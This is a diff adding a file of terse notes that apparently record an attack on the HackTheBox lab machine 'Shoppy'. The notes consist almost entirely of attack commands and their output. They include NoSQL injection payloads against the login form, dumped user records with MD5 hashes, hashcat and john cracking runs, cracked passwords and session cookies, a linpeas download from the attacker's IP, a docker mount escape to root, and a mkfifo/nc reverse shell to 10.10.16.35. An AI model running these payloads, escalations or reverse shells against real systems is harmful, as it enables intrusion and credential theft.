@@ -1,0 +1,122 @@
+jaeger
+
+python3 mongomap.py -u http://shoppy.htb/login?error=WrongCredentials
+
+python3 mongomap.py -u http://shoppy.htb/login --method post --data {\"username\":\"1\",\"password\":{\"$ne\":\"1\"}} -p username
+
+python3 mongomap.py -u http://shoppy.htb/login --method post --data {\"username\":\"1\",\"password\":{\"$ne\":\"1\"}} -p username
+
+python3 mongomap.py -u http://shoppy.htb/login --method post --data "username=jaeger&password=1"
+
+
+/home/kali/stuffs/htb/shoppy.htb/nosqlrequest
+
+Content-Type, application/x-www-form-urlencoded,Accept,'text/html\,application/xhtml+xml\,application/xml;q=0.9\,image/avif\,image/webp\,image/apng\,*/*;q=0.8\,application/signed-exchange;v=b3;q=0.9'
+
+
+Content-Type, application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+Content-Type,application/x-www-form-urlencoded,Accept,text/html,Host,shoppy.htb
+
+
+username='; return this; var dum = '&password=1
+
+
+
+connect.sid => nodejs
+
+[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"}]
+
+hashcat -a 0 -m 0 -w 4  '23c6877d9e2b564ef8b32c3a23de27b2' /usr/share/eaphammer/wordlists/rockyou.txt
+
+
+john --format=raw-md5 --wordlist=/usr/share/eaphammer/wordlists/rockyou.txt adminhash
+
+john --format=raw-md5 --wordlist=/usr/share/eaphammer/wordlists/rockyou.txt
+
+Host,shoppy.htb,Cookie,connect.sid=s:CHa9gDREtEnIZlGDptJswwU-byBbxdkg.612zCcgfhzKlaZZDGWrExOwfWsfoeQYS+CeagPAei4Q
+
+sudo python2 nosqlmap.py --attack 2  --platform MongoDB --victim shoppy.htb --webPort 80 --uri '/login' --httpMethod POST --verb ON --postData 'username,1,password,1' --requestHeaders 'Content-Type,application/x-www-form-urlencoded,Accept,text/html,Host,shoppy.htb' --injectedParameter 1 --injectSize 50 --injectFormat 1 --savePath nosqlmapresult
+
+
+Host: shoppy.htb,Cookie: connect.sid=s:eP1vuqMdmSWLD7r4EaFb-CRq6yjOr37q.sUgO/LZhuyGRFzp1kbwasvqvvDMFExgXitkC1gUbAPg
+
+
+dirsearch -u shoppy.htb/admin --random-agent -H 'Host: shoppy.htb' -H 'Cookie: connect.sid=s:eP1vuqMdmSWLD7r4EaFb-CRq6yjOr37q.sUgO/LZhuyGRFzp1kbwasvqvvDMFExgXitkC1gUbAPg' -e "*" -r
+
+wfuzz -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt -H "Host: FUZZ.shoppy.htb" --hc 403,400 -t 50 10.10.11.180
+
+wfuzz -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -H "Host: FUZZ.shoppy.htb" --hc 403,400,301 -t 50 10.10.11.180
+
+wfuzz -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt -H "Host: FUZZ.shoppy.htb" --hc 403,400,301 -t 50 10.10.11.180
+
+wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.shoppy.htb" --hc 403,400,301 -t 50 10.10.11.180
+
+'; return this; var dum = '
+
+[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
+
+hashcat -a 0 -m 0 -w 4  '6ebcea65320589ca4f2f1ce039975995' /usr/share/eaphammer/wordlists/rockyou.txt
+
+josh:remembermethisway
+
+username: jaeger
+password: Sh0ppyBest@pp!
+
+/home/deploy/password-manager
+
+sudo -H -u deploy /home/deploy/password-manager
+
+which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
+
+
+wget 10.10.16.35:8000/linpeas.sh
+
+gcc , Linux version 5.10.0-18
+Potentially Vulnerable to CVE-2022-0847
+
+Potentially Vulnerable to CVE-2022-2588
+
+
+
+cat /home/deploy/password-manager
+
+Welcome to Josh password manager!Please enter your master p                                                                                                                                                                        password: SampleAccess granted! Here is creds !
+
+
+
+cat /home/deploy/password-manager|strings
+
+Welcome to Josh password manager!
+Please enter your master password:
+Access granted! Here is creds !
+cat /home/deploy/creds.txt
+
+
+=> Sample
+
+jaeger@shoppy:~$ sudo -H -u deploy /home/deploy/password-manager
+Welcome to Josh password manager!
+Please enter your master password: Sample
+Access granted! Here is creds !
+Deploy Creds :
+username: deploy
+password: Deploying@pp!
+
+
+
+
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+
+if [[ ! $(cat /proc/1/sched | head -n 1 | grep init) ]]; then {
+    echo in docker
+} else {
+    echo not in docker
+} fi
+
+
+
+docker run d7d3d98c851f rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.35 7050 >/tmp/f
+
